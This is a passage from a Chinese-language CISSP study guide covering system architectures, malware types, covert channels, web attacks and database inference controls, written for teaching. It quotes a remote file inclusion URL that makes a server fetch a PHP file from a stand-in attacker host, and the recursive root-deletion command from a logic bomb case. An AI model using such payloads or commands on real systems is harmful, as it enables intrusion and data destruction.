  \ VM 那样隔离。图 4.17 来自美国能源部阿贡国家实验室，展示了容器和虚拟机之间的区别 [\\[20\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0105)。\n\
  \n![图 4.17 容器与虚拟机。](img/f04-17-9780443187346.jpg)\n\n图 4.17 容器与虚拟机。\n\n###### 无服务器\n\
  \n无服务器是一个容易让人误解的技术名称：它确实使用服务器，但这些服务器属于别人。“别人的服务器”是个更好的名字，尽管承认不那么朗朗上口。它也被称为函数即服务，这更准确。无服务器简单来说就是将代码发送到另一台服务器，由其返回结果。流行的无服务器技术包括\
  \ AWS（Amazon Web Services）Lambda、Azure Functions 和 Google Cloud Functions。\n\n下面是一个简单的“Hello\
  \ World!”风格的函数 [\\[21\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0110)，使用\
  \ Python 和 JSON（JavaScript 对象表示法）。请注意，Python 编程和 JSON 结构不在考试范围内；此处仅用于提供无服务器代码的简单示例。\n\
  \n```\nimport json\n\nprint('Loading function')\ndef lambda_handler(event, context):\n\
  \ print(\"value1 = \" + event['key1'])\n print(\"value2 = \" + event['key2'])\n\
  \ print(\"value3 = \" + event['key3'])\n```\n\n匹配的 JSON：\n\n```\n{\n \"key1\": \"\
  Pass\",\n \"key2\": \"the\",\n \"key3\": \"CISSP!\"\n}\n```\n\n图 4.18 显示了通过 AWS\
  \ Lambda 控制台输出的结果。\n\n![图 4.18 无服务器输出。](img/f04-18-9780443187346.jpg)\n\n图 4.18\
  \ 无服务器输出。\n\n我们已经在自己的 CPU 上运行此类函数几十年了。在这种情况下，函数被发送到 AWS，由 AWS 的 CPU 执行该函数并返回结果。AWS\
  \ 按执行该函数所需的 CPU 周期收费。这比在物理主机或虚拟机上运行代码高效得多（物理主机或虚拟机上运行着数百个其他进程并消耗 CPU 周期），也比容器高效（容器使用的\
  \ CPU 周期比物理主机或 VM 少，但比无服务器多）。\n\n##### 高性能计算（HPC）和网格计算\n\n高性能计算（HPC）和网格计算都旨在通过大量计算机实现高计算性能。关键区别在于：高性能计算系统（也称为超级计算机）利用单一位置的并行计算机（通常都在处理同一任务），而网格计算则利用大量分布式计算机（处理各种任务）。\n\
  \nHPC 系统利用海量 CPU 实现每秒千万亿次浮点运算（FLOPs）。常见的 HPC 应用包括 DNA 测序、自动驾驶、天气预测等。HPC 系统的主要目的是通过规模经济实现性能提升。HPC\
  \ 系统的一个关键安全问题是确保数据完整性在整个处理过程中得以维护。HPC 系统通常会利用一定程度的共享内存进行操作。如果管理不当，这种共享内存可能会暴露潜在的竞争条件，从而引入完整性挑战。\n\
  \n网格计算通常利用设备当前不需要用于自身需求的闲置 CPU 周期，并将它们集中用于网格计算资源的目标。虽然来自每台单个计算机的这些少量闲置周期对整体任务可能意义不大，但汇总起来却非常可观。SETI@HOME\
  \ 是网格计算的一个著名例子：它是“基于加州大学伯克利分校的一个科学实验，利用连接互联网的计算机搜寻地外文明（SETI）” [\\[22\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0115)。\n\
  \n##### 对等网络\n\n\n\n\n\n*对等*（P2P）网络改变了经典的客户端/服务器计算机模型。根据数据需求，任何系统都可以充当客户端、服务器或两者兼有。与大多数技术一样，大多数\
  \ P2P 网络在设计上对知识产权保持中立。也就是说，P2P 网络经常被用来下载商业音乐和电影，往往侵犯了知识产权所有者的权利。去中心化的对等网络具有弹性：没有可以被下线的中心服务器。\n\
  \n最早的 P2P 系统之一是最初的 Napster，它于 1999 年首次亮相。它旨在允许音乐共享，并且是部分对等的：下载以 P2P 方式进行，但中央索引服务器（用户可在其中搜索特定歌曲、专辑和艺术家）采用经典的客户端/服务器设计。\n\
  \n这种设计为代表音乐产业的律师提供了一个阿喀琉斯之踵：如果中央索引服务器被关闭，用户将无法定位音乐。这正是 2001 年发生的事情。在此期间及之后设计的许多\
  \ P2P 协议（包括 Gnutella 和 BitTorrent）都是去中心化的。如果你有一个拥有 10,000 个系统的 Gnutella 网络，其中任何\
  \ 1000 个下线，你现在就拥有一个拥有 9000 个系统的 Gnutella 网络。\n\n除了知识产权问题，完整性是 P2P 网络的一个关键关注点。在没有中央数据存储库的情况下，用户有什么保证能接收到合法数据？加密哈希是一种关键控制措施，应用于验证从\
  \ P2P 网络下载的数据的完整性。\n\n###### 瘦客户端\n\n*瘦客户端*比普通计算机系统更简单，不包含硬盘驱动器、完整操作系统、本地安装的应用程序等。它们依赖中央服务器，由中央服务器提供应用程序并存储相关数据。瘦客户端允许集中管理应用程序及其数据，以及升级、打补丁、数据存储等相关的安全成本。瘦客户端可以是基于硬件的（如无盘工作站）或基于软件的（如瘦客户端应用程序）。\n\
  \n####### 无盘工作站\n\n*无盘工作站*（也称为无盘节点）包含 CPU、内存和固件，但没有硬盘驱动器。无盘设备包括 PC、路由器、嵌入式设备等。内核和操作系统通常通过网络加载。硬件\
  \ UNIX X 终端是无盘工作站的一个例子。\n\n无盘工作站的 BIOS 开始正常的 POST 过程，加载 TCP/IP 协议栈，然后使用引导协议 (BOOTP)\
  \ 或动态主机配置协议 (DHCP) 等协议下载内核和操作系统。BOOTP 过去常用于 UNIX 无盘工作站。DHCP 将在第 5 章，第 4 领域：通信和网络安全中讨论，它比\
  \ BOOTP 具有更多功能，提供额外的配置信息，如默认网关和 DNS 服务器。\n\n####### 瘦客户端应用程序\n\n*瘦客户端应用程序*通常运行在具有完整操作系统的系统上，但使用\
  \ Web 浏览器作为通用客户端，提供对从瘦客户端服务器下载并在浏览器中运行的健壮应用程序的访问。这与“胖”应用程序形成对比，“胖”应用程序存储在本地，通常伴有本地存储的数据，且有时具有复杂的网络需求。\n\
  \n瘦客户端可以简化客户端/服务器和网络架构及设计，提高性能，并降低成本。所有数据通常存储在瘦客户端服务器上。网络流量通常使用 HTTP（TCP 端口 80）和\
  \ HTTPS（TCP 端口 443）。客户端必须修补浏览器和操作系统以维护安全，但瘦客户端应用程序在服务器端打补丁。Citrix ICA、2X ThinClientServer\
  \ 和 OpenThinClient 是瘦客户端应用程序的例子。\n\n###### 嵌入式系统和物联网\n\n嵌入式系统是执行有限功能集的计算机，这与执行各种功能的通用系统（如运行\
  \ Windows 11 的台式计算机）不同。嵌入式系统的例子包括 HVAC（暖通空调）控制器、医疗设备（如心脏监护仪或静脉滴注泵）、ATM 和“智能”家电。“嵌入式”部分意味着它们显然不是计算机：一台“智能”洗碗机在外观上与不包含计算机的旧式机械洗碗机基本相同。\n\
  \n物联网 (IoT) 是指连接互联网的小型设备，如婴儿监视器、恒温器、收银机、家电、灯泡、智能电表、健身监测仪和汽车。许多此类设备通常可直接通过互联网访问。这些是联网的嵌入式系统。它们的风险更大，因为它们可能通过网络被攻破：非联网嵌入式设备需要物理访问才能被攻破。\n\
  \n你可能把“智能”电视当作一台电视（确实如此），但它很可能也在运行像 Linux 这样的服务器操作系统。这些设备可能带来重大安全风险：默认凭据很常见，企业管理工具通常缺失，甚至像打补丁这样简单的问题也可能很难（甚至不可能）解决。供应商通常发布基础操作系统补丁的速度相当慢，并且通常会终止对仍在广泛使用的设备的支持。\n\
  \n在考虑“智能”设备时请记住希波宁定律，这是由 Mikko Hypponen 创造的一个术语。他的 Twitter 推文 [\\[23\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0120)\
  \ 如图 4.19 所示。\n\n![图 4.19 希波宁定律。](img/f04-19-9780443187346.jpg)\n\n图 4.19 希波宁定律。\n\
  \n请注意，Mikko Hypponen 本人（或他的定律）不是 CISSP® 考试的考点，但在购买或部署“智能”设备时牢记他的定律是个好主意：相关的被攻破风险是否值得其带来的收益？\n\
  \n“永久设备”代表了重大风险：它们是长时间（数年甚至数十年）运行而不接收安全更新的设备。对于可能通过网络被攻破的 IoT 设备，这种风险更高。一些嵌入式设备可以运行数十年，例如“智能”电视和汽车中的嵌入式设备。\n\
  \n###### 分布式系统和边缘计算系统\n\n分布式系统将来自多个位置的计算机组合在一起，并将它们视为一个逻辑系统。例如：数百万人访问 `https://google.com`\
  \ 似乎都在访问同一个系统，但实际上涉及数千台地理位置分布的服务器。STI Partners 定义分布式计算为：“分布式计算是指跨分布式计算频谱中的不同位置移动工作负载的能力。如下所示，这包括传统云（私有或公有）、边缘以及潜在的终端设备中的位置”\
  \ [\\[24\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0125)。\n\n分布式计算使用一系列系统，从集中式基于云的系统到本地边缘系统（位于客户站点内或附近）。边缘计算是分布式计算的一个组成部分，旨在将数据推送到网络边缘（并更接近客户）。这允许更快的下载速度、低网络延迟，并可以利用本地\
  \ CPU 执行复杂计算（而不是将数据上传到中心位置进行处理）。内容分发网络 (CDN) 是边缘计算的早期形式，将在第 5 章，第 4 领域：通信和网络安全中讨论。\n\
  \n###### 工业控制系统 (ICS)\n\n\n\n\n###### 工业控制系统 (ICS)\n\n工业控制系统 (ICS) 是发电、制造和自动化等行业使用的计算机。历史上，工业控制系统中使用的协议（如\
  \ `Modbus`）均为明文且相当不安全。这种风险曾因这些系统（过去）通常与互联网隔离，并依赖串行通信（很像调制解调器）在一个设施内进行通信而得到缓解。多年来，这种情况已发生相当大的变化，这些系统现在通常连接到互联网。以前使用串行线路的协议（如\
  \ `Modbus`）已更新为使用 `TCP/IP`（`Modbus TCP`）。不幸的是，`Modbus TCP` 是明文的，需要加密隧道才能安全传输。\n\n\
  Dong-Ho Kang、Byoung-Koo Kim、Jung-Chan Na 对 `Modbus` 进行了如下描述：*Modbus 中不存在安全要素。任何能够访问\
  \ Modbus 服务器的攻击者都能够读写现场设备，以及重启设备和运行诊断命令。Modbus 协议的简单性以及免费 Modbus 客户端的广泛可用性，使得攻击\
  \ Modbus 服务器变得相对简单* [\\[25\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0130)。\n\
  \n####### 重要 ICS 术语\n\n*   **数据采集与监视控制系统 (SCADA)：** SCADA（即数据采集与监视控制）系统是指一个由若干远程终端单元（或\
  \ RTU）组成的系统，这些单元采集现场数据并通过通信系统连接回主站。\n*   **远程终端单元 (RTU)：** RTU（有时称为远程遥测单元）顾名思义，是一个独立的数据采集和控制单元，通常基于微处理器，用于监控和控制距离中央站较远位置的设备。\n\
  *   **分布式控制系统 (DCS)：** 在 DCS 中，数据采集和控制功能由若干基于微处理器的分布式单元执行，这些单元位于受控设备附近或采集数据的仪表附近\
  \ [\\[26\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb261)。\n*   **可编程逻辑控制器\
  \ (PLC)：** 一种小型、模块化的固态计算机，带有用于执行特定任务的定制指令。PLC 用于工业控制系统 (ICS) 的各种行业，已很大程度上取代了机械继电器、鼓式定序器和凸轮定时器\
  \ [\\[27\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0135)。\n\n### 系统漏洞、威胁和对策\n\
  \n系统威胁、漏洞和对策描述了安全架构和设计漏洞，以及可能危害系统安全的相应利用手段。我们还将讨论降低相关风险的对策或缓解措施。\n\n#### 电磁辐射\n\n\
  *电磁辐射* 是指从电子系统逸出的能量，在特定情况下可被远程监控。能量包括电磁干扰，将在本章后面讨论。\n\n《Wired Magazine》在文章“解密的 NSA\
  \ 文件揭示 TEMPEST 秘史”中讨论了电子辐射的发现：“那是 1943 年，一位贝尔电话工程师正在研究美国政府最敏感、最重要的战时机械之一——贝尔电话 131-B2\
  \ 型……然后他注意到了一些奇怪的事情。实验室远处，一个独立的示波器养成了一个习惯：每当电传打字机加密一个字母，它就会尖峰一次。仔细检查后，这些尖峰可以转译为该机器正在处理的明文消息。尽管他当时可能并不知情，但这位工程师刚刚发现了所有信息处理机器都会将其秘密发送到电磁以太中”\
  \ [\\[28\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0140)。\n\n基于这一发现，开发了\
  \ *TEMPEST*（并非首字母缩写，而是美国国家安全局的一个代号），作为一项屏蔽计算机设备电磁辐射的标准。\n\n#### 隐蔽信道\n\n*隐蔽信道* 是指任何违反安全策略的通信。安装在系统上的恶意软件用于定位个人身份信息\
  \ (PII)（如信用卡信息）并将其发送到恶意服务器所使用的通信信道，就是隐蔽信道的一个例子。隐蔽信道有两种具体类型：*存储信道* 和 *时序信道*。\n\n\
  隐蔽信道的对立面是 *公开信道*：符合安全策略的授权通信。\n\n##### 隐蔽存储信道\n\n存储信道示例使用共享存储（如临时目录）来允许两个主体相互发送信号。设想\
  \ Alice 是拥有最高机密许可的主体，而 Bob 是拥有机密许可的主体。Alice 拥有她想与 Bob 共享的最高机密信息，但强制访问控制 (MAC) 系统会阻止她这样做。\n\
  \nBob 可以看到 Alice 临时文件的大小，但看不到内容。他们制定了一种代码：1 兆字节文件意味着战争迫在眉睫（标记为最高机密的数据），0 字节文件意味着“一切安全”。Alice\
  \ 在临时目录中维护一个 0 字节文件，直到战争迫在眉睫时将其改为 1 兆字节文件，从而向 Bob 发送信号，违反了系统的 MAC 策略。\n\n##### 隐蔽时序信道\n\
  \n隐蔽时序信道依赖系统时钟来推断敏感信息。隐蔽时序信道的一个例子是不安全的登录系统。该系统配置为：如果用户输入正确的用户名但密码错误，或用户名和密码均错误，则提示“用户名或密码错误”。这样做是为了防止外部攻击者推断真实用户名。\n\
  \n我们这个不安全的系统在用户输入错误用户名/错误密码时会立即打印“用户名或密码错误”，但当用户输入正确用户名但密码错误时，会有轻微延迟（由于检查加密哈希所需的时间）。这种时序延迟允许攻击者推断哪些用户名是正确或错误的，违反了系统的安全设计。\n\
  \n###### 后门\n\n*后门* 是系统中的一种捷径，允许用户绕过安全检查（如用户名/密码认证）进行登录。攻击者在攻破系统后通常会安装后门。例如，攻击者通过利用缺失补丁导致的漏洞获得系统的\
  \ Shell 访问权限。攻击者希望保持访问权限（即使系统打了补丁），因此她安装了一个后门以允许未来的访问。\n\n*维护钩子* 是一种后门；它们是系统设计人员和程序员安装的捷径，旨在允许开发人员在开发期间绕过正常的系统检查，例如要求用户认证。如果维护钩子保留在生产系统中，就会成为安全问题。\n\
  \n#### 恶意代码\n\n*恶意代码* 或 *恶意软件* 是攻击应用程序或系统的任何类型软件的统称。恶意代码有多种类型；病毒、蠕虫、特洛伊木马和逻辑炸弹都可能对目标系统造成损害。\n\
  \n零日漏洞利用是指没有供应商提供的补丁的恶意代码（威胁）（意味着存在未修补的漏洞）。\n\n##### 计算机病毒\n\n计算机病毒是不会自动传播的恶意软件：它们需要载体（通常是人）。它们经常通过软盘传播，以及（最近更多地）通过便携式\
  \ USB (通用串行总线) 内存传播。这些设备可能被物理携带并插入多台计算机。\n\n病毒类型包括：\n\n*   **宏病毒：** 使用宏语言编写的病毒（如\
  \ Microsoft Office 或 Microsoft Excel 宏）\n*   **引导扇区病毒：** 感染 PC 引导扇区的病毒，确保病毒在系统启动时加载\n\
  \n\n\n\n\n##### 恶意软件类型\n\n*   **Stealth virus（隐形病毒）**：一种对操作系统和其他防护软件（如杀毒软件）隐藏自身的病毒。\n\
  *   **Polymorphic virus（多态病毒）**：一种在感染新系统时改变其签名的病毒，试图逃避基于签名的杀毒软件。\n*   **Multipartite\
  \ virus（多重病毒）**：一种通过多种传播媒介传播的病毒，也称为 multipart virus。\n\n###### Worms（蠕虫）\n\nWorms\
  \ 是能够自我传播（独立扩散）的恶意软件。“Worm”一词由 John Brunner 于 1975 年在科幻小说 *The Shockwave Rider*\
  \ 中创造。Worms 通常通过两种方式造成破坏：一是它们携带的恶意代码；二是由于激进的自我传播导致网络可用性丧失。Worms 引发了历史上一些最具破坏性的网络攻击。\n\
  \n第一个大规模传播的蠕虫是 1988 年的 Morris worm，由 Robert Tappan Morris, Jr. 编写。此后出现了许多互联网蠕虫，包括\
  \ 2003 年的 Blaster worm、2004 年的 Sasser worm、2008 年及以后的 Conficker worm 等。\n\n######\
  \ Trojans（特洛伊木马）\n\nTrojan（也称为 Trojan horse）是一种执行双重功能的恶意软件：一种是良性功能（如游戏），另一种是恶意功能。该术语源自维吉尔史诗\
  \ *The Aeneid* 中描述的特洛伊木马。\n\n###### Rootkits（Rootkit/Rootkit 工具包）\n\nRootkit 是一种替换内核和/或操作系统部分组件的恶意软件。用户态\
  \ Rootkit 在大多数系统的 Ring 3 下运行，替换“用户空间”中的操作系统组件。常被 Rootkit 替换的二进制文件包括 Linux/UNIX 系统上的\
  \ `ls` 或 `ps` 命令，或 Microsoft Windows 系统上的 `dir` 或 `tasklist`。\n\n内核态 Rootkit 替换内核，或加载恶意的可加载内核模块。内核态\
  \ Rootkit 在大多数操作系统的 Ring 0 下运行。\n\n###### Packers（加壳工具）\n\nPackers 提供可执行文件的运行时压缩。原始\
  \ exe 被压缩，并将一个小型的可执行解压缩器添加到 exe 头部。执行时，解压缩器解包压缩的可执行机器码并运行它。\n\nPackers 是一种中立技术，用于减小可执行文件体积。许多类型的恶意软件使用\
  \ Packers，可用于逃避基于签名的恶意软件检测。常见的 Packer 是 UPX (Ultimate Packer for eXecutables)，可在\
  \ [`upx.github.io/`](https://upx.github.io/) 获取。\n\n###### Logic Bombs（逻辑炸弹）\n\n\
  *Logic bomb* 是一种在满足逻辑条件时触发的恶意程序，例如处理一定数量的交易后，或在特定日期（也称为 time bomb/定时炸弹）。蠕虫等恶意软件通常包含逻辑炸弹，表现出一种行为，然后在特定日期和时间改变策略。\n\
  \nRoger Duronio 在因年度奖金纠纷心生不满后，成功针对其雇主 UBS PaineWebber 部署了逻辑炸弹。他在 2000 台 UBS PaineWebber\
  \ 系统上安装了逻辑炸弹，由 2002 年 3 月 4 日上午 9:30 的日期和时间触发：“这一天，公司 2000 台服务器宕机，导致全国约 17,000 名经纪人无法进行交易。近\
  \ 400 家分支机构受到影响。文件被删除。备份在运行几分钟内也宕机了” [\\[29\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0145)。\n\
  \nDuronio 的代码运行了命令 `/usr/sbin/mrm –r / &`（一个递归删除根分区（包括所有文件和子目录）的 UNIX shell 命令）。他被判处联邦监狱\
  \ 8 年零 1 个月有期徒刑。\n\n###### Antivirus Software（杀毒软件）\n\nAntivirus software 旨在预防和检测恶意软件感染。基于签名的杀毒软件使用已知恶意软件的静态签名。基于启发式的杀毒软件使用基于异常的检测，尝试识别恶意软件的行为特征，如修改引导扇区。\n\
  \n##### Server-Side Attacks（服务端攻击）\n\n*Server-side attacks*（也称为 service-side attacks/服务侧攻击）是从攻击者（客户端）直接发起针对监听服务的攻击。攻击过程如\
  \ Fig. 4.20 所示，`evil.example.com` 对监听在 TCP 445 端口的 `bank.example.com` 发起攻击。\n\n\
  ![Fig. 4.20 Server-side attack.](img/f04-20-9780443187346.jpg)\n\nFig. 4.20 Server-side\
  \ attack.\n\n打补丁、系统加固、防火墙及其他纵深防御形式可缓解服务端攻击。除非系统经过加固并部署在 DMZ 网络中（我们将在 Chapter 5，Domain\
  \ 4: Communication and Network Security 中讨论），否则组织不应允许来自互联网等不可信网络的直接访问服务器端口。\n\n\
  > **Note**\n>\n> 服务端攻击利用已安装服务中的漏洞。这不仅仅是“服务器”问题（如运行 Windows Server 2022 的文件服务器）：运行\
  \ Ubuntu Linux 22.04 和 Windows 11 等操作系统的台式机和笔记本电脑也运行服务，可能容易受到服务端攻击。有些人倾向于使用“service-side\
  \ attack”以明确这一区别，但考试使用术语“server-side”。\n\n##### Client-Side Attacks（客户端攻击）\n\n*Client-side\
  \ attacks* 发生在用户下载恶意内容时。与服务端攻击相比，数据流向相反：客户端攻击由受害者发起，从攻击者处下载内容，如 Fig. 4.21 所示。\n\n\
  ![Fig. 4.21 Client-side attack.](img/f04-21-9780443187346.jpg)\n\nFig. 4.21 Client-side\
  \ attack.\n\n对于允许互联网访问的组织，客户端攻击难以缓解。客户端包括文字处理软件、电子表格、媒体播放器和 Web 浏览器。Chrome 和 Firefox\
  \ 等浏览器实际上是软件集合：浏览器本身，加上 Adobe Acrobat Reader、iTunes、QuickTime 等第三方软件。所有这些都可能容易受到客户端攻击。所有客户端软件都必须打补丁，这是许多组织面临的挑战。\n\
  \n大多数防火墙的入站限制远比出站严格：它们设计用于“拦截坏人”，缓解源自不可信网络的服务端攻击。它们往往无法防止客户端攻击。\n\n##### Web Architecture\
  \ and Attacks（Web 架构与攻击）\n\n15 年前的 World Wide Web 更简单：大多数网页是静态的，用 HTML 渲染。“Web 2.0”的出现带来了动态内容、多媒体和用户创建的数据，增加了\
  \ Web 的攻击面：创造了更多攻击向量。PHP（一个“递归首字母缩写”，代表 PHP: Hypertext Preprocessor）等动态 Web 语言使网页功能更强大、更动态，但也更容易受到安全攻击。\n\
  \n一个 PHP 攻击示例是“远程文件包含”攻击。URL（统一资源定位符）如 `https://good.example.com/index.php?file=readme.txt`\
  \ 引用一个名为 `index.php` 的 PHP 脚本。该脚本动态加载“?”后引用的文件 `readme.txt`，并在浏览器中显示。\n\n攻击者在 Web\
  \ 服务器 `evil.example.com` 上托管一个名为 `evil.php` 的恶意 PHP 文件，然后操纵 URL，输入：\n\n`https://good.example.com/index.php?file=https://evil.example.com/evil.php`\n\
  \n如果 `good.example.com` 配置不当，它将下载 `evil.php` 并在本地执行，允许攻击者窃取信息、创建后门并执行其他恶意任务。\n\n\
  ###### Applets\n\n\n\n\n\n###### 小程序\n\n**小程序** 是嵌入在其他软件（如 Web 浏览器）中的小段移动代码。与提供内容显示方式的\
  \ HTML（超文本标记语言）不同，小程序是可执行文件。主要的安全顾虑在于小程序从服务器下载后在本地运行。恶意小程序可能会危及客户端的安全。\n\n小程序可以用多种编程语言编写；两种主要的小程序语言是\
  \ **Java**（由 Oracle/Sun Microsystems 开发）和 **ActiveX**（由 Microsoft 开发）。\"Applet\"\
  \ 一词用于 Java，而 \"control\" 用于 ActiveX，尽管它们在功能上相似。\n\n###### Java\n\nJava 是一种面向对象的语言，不仅用于编写小程序，还作为一种通用编程语言。Java\
  \ 字节码与平台无关：它由 Java 虚拟机（`JVM`）解释执行。`JVM` 可用于多种操作系统，包括 Linux、FreeBSD 和 Microsoft Windows。\n\
  \nJava 小程序在沙箱中运行，将代码与操作系统隔离开。沙箱旨在防止攻击者在攻破 Java 小程序后访问系统文件（如密码文件）。在沙箱中运行的代码必须是自给自足的：它不能依赖沙箱外部存在的操作系统文件。受信任的\
  \ Shell 是静态编译的 Shell（不使用操作系统共享库），可用于沙箱中。\n\n###### ActiveX\n\nActiveX 控件是 Java 小程序的功能等价物。它们使用数字证书而非沙箱来提供安全性。ActiveX\
  \ 控件与操作系统的联系更紧密，允许通过 Windows Update 安装补丁等功能。与 Java 不同，ActiveX 是 Microsoft 技术，仅适用于\
  \ Microsoft Windows 操作系统。\n\n###### OWASP\n\n开放 Web 应用程序安全项目（`OWASP`，参见 [`www.owasp.org`](https://www.owasp.org)）是最好的应用安全资源之一。`OWASP`\
  \ 提供了大量免费资源，致力于改善组织的应用安全状况。他们最著名的项目之一是 OWASP Top 10 项目，该项目就什么是 10 个最重要的应用安全风险提供了共识指导。OWASP\
  \ Top 10 可在 [`owasp.org/www-project-top-ten/`](https://owasp.org/www-project-top-ten/)\
  \ 获取。\n\n除了关于应用安全威胁、漏洞和防御的丰富信息外，`OWASP` 还维护着几款可免费下载的安全工具，包括一款领先的拦截代理：`ZAP`，即 Zed\
  \ Attack Proxy。\n\n###### XML\n\n**XML**（可扩展标记语言）是一种标记语言，旨在作为编码文档和数据的标准方式。XML 类似于\
  \ HTML，但更通用。XML 用于 Web，但不局限于 Web：XML 可用于存储应用程序配置和审计工具的输出，还有许多其他用途。可扩展意味着用户可以使用 XML\
  \ 定义自己的数据格式。\n\n###### 面向服务的架构 (SOA)\n\n面向服务的架构（`SOA`）试图将应用程序架构简化为服务的功能单元。`SOA`\
  \ 旨在允许多个异构应用程序成为服务的消费者。服务可在整个组织中使用和重用，而非在每个需要该服务提供的功能的单个应用程序中单独构建。\n\n服务预期应与平台无关，并能以不依赖特定编程语言的通用方式被调用。其意图是任何应用程序只需使用其所选编程语言中可用的标准手段即可利用该服务。服务通常以某种形式的目录发布，提供有关如何使用该服务及其提供功能的详细信息。\n\
  \n虽然 Web 服务不是唯一的例子，但它们是 `SOA` 模型最常见的例子。XML 或 JSON（JavaScript 对象表示法）常用于 Web 服务的底层数据结构，SOAP（最初是\
  \ \"Simple Object Access Protocol\" 的首字母缩写，但现在仅称为 \"SOAP\"）或 REST（表述性状态转移）提供连接性，而\
  \ WSDL（Web 服务描述语言）提供有关如何调用 Web 服务的详细信息。\n\n> **考试警告**\n>\n> 不要混淆面向服务的架构（`SOA`）与\
  \ SOAP。它们相关但不同：`SOA` 可能使用 SOAP 进行连接。\n\n#### 数据库安全\n\n数据库带来了独特的安全挑战。数据库中可能存放的海量数据需要特殊的安全考量。正如我们将在\
  \ \"推理与聚合\" 部分看到的那样，数据库用户通过创建、查看和比较记录建立的逻辑联系可能导致推理和聚合攻击，这需要数据库安全预防措施，如 **推理** 控制和\
  \ **多实例化**。\n\n##### 多实例化\n\n多实例化允许两个不同的对象拥有相同的名称。该名称基于拉丁语词根：multiple（多个，poly）和\
  \ instances（实例，instantiation）。数据库多实例化意味着两行可能具有相同的主键，但数据不同。\n\n假设你有一个多级安全数据库表。每个元组（元组是关系数据库中的一行或一个条目）包含带有机密、秘密或绝密安全标签的数据。具有相同三种级别许可的主体可以访问该表。系统遵循强制访问控制规则，包括\
  \ \"不上读\"：秘密主体不能读取标记为绝密的条目。\n\n一位具有秘密许可的经理正准备裁员，打开 \"layoffs\"（裁员）表，并尝试为员工 John\
  \ Doe 创建一个主键为 `123-45-6789` 的条目。该秘密主体不知道已存在一个主键相同、标记为绝密的 John Doe 条目。事实上，整个部门（包括经理）都存在标记为绝密的条目：整个部门都将被裁员。此信息标记为绝密：经理无法读取。\n\
  \n正常数据库通常要求表中所有行包含唯一的主键，因此当经理尝试插入新条目时，普通数据库会生成类似 \"duplicate entry\"（重复条目）的错误。多级安全数据库不能这样做，否则会允许经理推断出绝密信息。\n\
  \n多实例化意味着数据库将创建两个具有相同主键的条目：一个标记为秘密，一个标记为绝密。\n\n##### 推理与聚合\n\n当用户能利用较低级别的访问权限获取受限信息时，就会发生推理和\
  \ **聚合**。这些问题发生在多个领域，包括数据库安全。\n\n推理需要演绎：有一个谜题待解，较低级别的细节提供了线索。聚合是一个数学过程：用户提出所有问题，获得所有答案，并推导出受限信息。\n\
  \n###### 举例学习\n\n####### 五角大楼披萨推理\n\n\n\n\n######## 美国国防部五角大楼在 1991 年 1 月 16 日晚上订购了大量披萨，远超正常水平。\n\
  \n披萨外卖车的庞大数量让许多没有美国军方安全许可的人员注意到，有很多人在加班加点工作，因此推断即将发生大事。他们的推断是正确的；沙漠风暴行动（即第一次海湾战争）即将发动：“除了技术手段外，Ceralde\
  \ 少校举了一个例子，说明看似‘无害’的信息片段如何能勾勒出全貌。他描述了 1991 年 1 月 16 日晚上，五角大楼停车场停放的车辆比平时多，披萨店发现送往五角大楼和其他政府机构的披萨订单显著增加。Ceralde\
  \ 少校说，这些观察属于指标，是所有人都能获取的非密信息。沙漠风暴行动正是在那个晚上开始的” [\\[30\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0150)。\n\
  \n推理需要演绎：线索摆在面前，使用者进行逻辑演绎。这就像侦探破案：“为什么五角大楼停车场有这么多披萨外卖车？肯定有很多人通宵达旦地工作……我想知道为什么？”在我们的数据库示例中，需要多实例化来防止经理推断出已经计划裁掉\
  \ John Doe。\n\n聚合与推理类似，但有一个关键区别：不需要演绎。聚合提出所有问题，获取所有答案，然后使用者组装出受限信息。\n\n想象你有一个在线电话数据库。普通用户可以将姓名（如\
  \ Jane Doe）解析为号码（如 555-1234）。他们也可以执行反向查找，将 555-1234 解析为 Jane Doe。普通用户无法下载整个数据库：只有电话管理员才能这样做。这是为了防止推销员下载整个电话数据库并向组织内所有人推销电话。\n\
  \n聚合允许普通用户下载整个数据库，获取通常仅限电话管理员访问的信息。当普通用户对 555-0000 执行反向查找，然后是 555-0001、555-0002\
  \ 等，直到 555-9999 时，就会发起聚合攻击。用户提出每一个问题（对一个电话交换局内每个号码进行反向查找），获得每一个答案，并聚合出整个电话数据库。\n\
  \n##### 推理与聚合控制\n\n数据库可能需要推理和聚合控制。基于前面“五角大楼披萨”案例的现实推理控制示例是：与供餐商签订保密协议（NDA）合同，要求其在短时间内安全、灵活地配送所需数量的食物。\n\
  \n数据库推理控制的一个示例是多实例化。数据库聚合控制可能包括将普通用户限制为有限数量的查询。\n\n##### 数据挖掘\n\n*数据挖掘* 在海量数据中搜索模式，这些模式否则会“淹没在噪音中”。信用卡发行机构已成为数据挖掘专家，他们搜索数据库中存储的数百万笔信用卡交易，以发现欺诈迹象。简单的数据挖掘规则，如“在\
  \ Y 时间内，在 Z 地点进行 X 次或更多次购买”，可用于发现被盗并被欺诈性使用的信用卡。\n\n数据挖掘引发了隐私担忧：想象一下，如果人寿保险公司利用数据挖掘追踪香烟和酒精等购买记录，并以此为由拒绝理赔。\n\
  \n##### 数据分析\n\n数据分析可通过让组织更好地了解典型用例以及什么构成了与数据库的典型或正常交互基线，从而在数据库安全中发挥作用。了解正常操作的样子，可能让组织更主动地识别来自内部威胁或被盗用账户的滥用行为。考虑到数据库中极有可能存放着重要和/或敏感数据，任何能提高组织检测滥用能力的工具都可能对安全产生重大裨益。\n\
  \n##### 对策\n\n缓解前一节所述攻击的主要对策是*纵深防御*：跨越多个领域的多重重叠控制，相互增强、相互支撑。任何单一控制都可能失效；纵深防御（也称为分层防御）可缓解这一问题。\n\
  \n技术对策将在 第 5 章，领域 4：通信与网络安全中讨论。它们包括路由器和交换机、防火墙、系统加固（包括移除不必要的服务和打补丁）、虚拟专用网络等。\n\n\
